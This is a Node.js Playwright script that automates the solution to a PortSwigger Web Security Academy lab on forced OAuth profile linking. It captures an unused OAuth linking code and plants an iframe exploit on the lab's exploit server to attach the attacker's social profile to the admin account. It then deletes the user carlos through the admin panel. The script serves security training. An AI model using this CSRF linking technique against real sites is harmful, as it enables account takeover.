#!/usr/bin/env node
/**
 * OAuth #3 - Forced profile linking
 * Fixed solver that properly captures the OAuth callback URL
 */
const { chromium } = require('playwright');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;
const LAB_PAGE = 'https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking';

async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function main() {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  
  try {
    console.log('[*] Login to PortSwigger...');
    await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
    await page.fill('#EmailAddress', EMAIL);
    await page.fill('#Password', PASSWORD);
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('#Login'),
    ]);
    await sleep(2000);
    
    console.log('[*] Launch lab...');
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    await (await page.locator('a:has-text("ACCESS THE LAB")').first()).click();
    await sleep(40000);
    
    let labUrl = null;
    for (const p of ctx.pages()) {
      const u = p.url();
      if (u.includes('web-security-academy.net')) { labUrl = u.replace(/\/$/, ''); break; }
    }
    if (!labUrl) throw new Error('No lab URL');
    console.log('[+] Lab URL:', labUrl);
    
    // Find exploit server URL
    const exploitLink = await page.locator('a:has-text("Go to exploit server")').first();
    const exploitUrl = await exploitLink.getAttribute('href');
    console.log('[+] Exploit server:', exploitUrl);
    
    // Step 1: Login as wiener on the lab
    console.log('[*] Login as wiener on lab...');
    await page.goto(labUrl + '/login', { waitUntil: 'domcontentloaded', timeout: 15000 });
    await sleep(2000);
    await page.fill('input[name=username]', 'wiener');
    await page.fill('input[name=password]', 'peter');
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('button[type=submit]'),
    ]);
    await sleep(2000);
    
    // Step 2: Click "Attach a social profile" - INTERCEPT the oauth-linking redirect
    console.log('[*] Going to my-account to find Attach link...');
    await page.goto(labUrl + '/my-account', { waitUntil: 'domcontentloaded', timeout: 15000 });
    await sleep(2000);
    
    // Find the "Attach a social profile" link
    const attachHref = await page.evaluate(() => {
      const links = [...document.querySelectorAll('a[href]')];
      const attach = links.find(a => /attach/i.test(a.textContent || '') || /oauth-linking|social.*profile/i.test(a.href));
      return attach ? attach.href : null;
    });
    if (!attachHref) throw new Error('Attach social profile link not found');
    console.log('[+] Attach URL:', attachHref);
    
    // Set up interception BEFORE navigation
    let capturedCallbackUrl = null;
    
    // Use request handler to intercept redirects
    page.on('request', (req) => {
      const u = req.url();
      if (u.includes('/oauth-linking?code=')) {
        capturedCallbackUrl = u;
        console.log('[+] Captured oauth-linking callback:', u);
      }
    });
    
    // Navigate to OAuth provider - follow the flow
    console.log('[*] Following OAuth flow...');
    try {
      await page.goto(attachHref, { waitUntil: 'domcontentloaded', timeout: 20000 });
    } catch (e) {
      console.log('  Navigation error (expected):', e.message);
    }
    await sleep(3000);
    
    // Now we should be on OAuth provider login page
    const currentUrl = page.url();
    console.log('[*] Current URL:', currentUrl);
    
    // Login to social provider as peter.wiener/hotdog
    if (currentUrl.includes('oauth') || currentUrl.includes('social')) {
      const userInput = page.locator('input[name="username"], input[type="email"]').first();
      if (await userInput.count() > 0) {
        console.log('[*] Entering social credentials...');
        await userInput.fill('peter.wiener');
        await page.locator('input[name="password"], input[type="password"]').first().fill('hotdog');
        await Promise.all([
          page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
          page.locator('button[type=submit], input[type=submit]').first().click(),
        ]);
        await sleep(3000);
      }
      
      // Authorize if needed
      const authorizeBtn = page.locator('button:has-text("Authorize"), button:has-text("Allow"), button:has-text("Continue")').first();
      if (await authorizeBtn.count() > 0) {
        console.log('[*] Authorizing...');
        // Use route to block the oauth-linking request so code stays valid
        await ctx.route('**/oauth-linking?code=*', async (route) => {
          capturedCallbackUrl = route.request().url();
          console.log('[+] Captured via route:', capturedCallbackUrl);
          await route.abort();
        });
        
        await authorizeBtn.click().catch(() => {});
        await sleep(5000);
      }
    }
    
    console.log('[+] Captured callback URL:', capturedCallbackUrl);
    if (!capturedCallbackUrl) throw new Error('OAuth callback URL not captured');
    
    // Step 3: Store exploit on exploit server
    console.log('[*] Storing exploit on exploit server...');
    await page.goto(exploitUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await sleep(2000);
    
    const exploitHtml = `<iframe src="${capturedCallbackUrl}"></iframe>`;
    
    await page.fill('textarea[name="responseBody"]', exploitHtml);
    await page.locator('button:has-text("Store"), input[value="Store"]').first().click().catch(() => {});
    await sleep(2000);
    
    // Deliver to victim
    console.log('[*] Delivering to victim...');
    await page.locator('button:has-text("Deliver"), input[value*="Deliver"]').first().click().catch(() => {});
    await sleep(10000);
    
    // Step 4: Logout and login via social media
    console.log('[*] Logout and login via social media...');
    await page.goto(labUrl + '/logout', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
    await sleep(2000);
    
    // Clear cookies
    await ctx.clearCookies();
    await ctx.unroute('**/oauth-linking?code=*').catch(() => {});
    
    // Go to login page and click social login
    await page.goto(labUrl + '/login', { waitUntil: 'domcontentloaded', timeout: 15000 });
    await sleep(2000);
    
    const socialLoginLink = await page.evaluate(() => {
      const links = [...document.querySelectorAll('a[href]')];
      const social = links.find(a => /social/i.test(a.textContent || '') || /oauth/i.test(a.href));
      return social ? social.href : null;
    });
    
    if (socialLoginLink) {
      console.log('[*] Clicking social login...');
      await page.goto(socialLoginLink, { waitUntil: 'domcontentloaded', timeout: 20000 });
      await sleep(3000);
      
      // Login to social provider again (may need to re-auth)
      const userInput2 = page.locator('input[name="username"], input[type="email"]').first();
      if (await userInput2.count() > 0) {
        await userInput2.fill('peter.wiener');
        await page.locator('input[name="password"], input[type="password"]').first().fill('hotdog');
        await Promise.all([
          page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
          page.locator('button[type=submit], input[type=submit]').first().click(),
        ]);
        await sleep(3000);
        
        const authBtn2 = page.locator('button:has-text("Authorize"), button:has-text("Allow"), button:has-text("Continue")').first();
        if (await authBtn2.count() > 0) {
          await authBtn2.click();
          await sleep(3000);
        }
      }
    }
    
    // Step 5: Access admin panel and delete carlos
    console.log('[*] Deleting carlos...');
    await page.goto(labUrl + '/admin', { waitUntil: 'domcontentloaded', timeout: 15000 });
    await sleep(2000);
    
    const deleteLink = page.locator('a[href*="delete"][href*="carlos"]').first();
    if (await deleteLink.count() > 0) {
      await deleteLink.click();
      await sleep(3000);
    } else {
      // Try direct URL
      await page.goto(labUrl + '/admin/delete?username=carlos', { waitUntil: 'domcontentloaded', timeout: 15000 });
      await sleep(3000);
    }
    
    // Verify
    console.log('[*] Verifying...');
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    const html = await page.content();
    const solved = html.includes('is-solved') || html.includes('Congratulations');
    console.log(solved ? 'SOLVED' : 'NOT SOLVED');
    process.exit(solved ? 0 : 1);
  } catch (e) {
    console.error('Error:', e.message);
    console.log('NOT SOLVED');
    process.exit(1);
  } finally {
    await browser.close().catch(() => {});
  }
}

main();
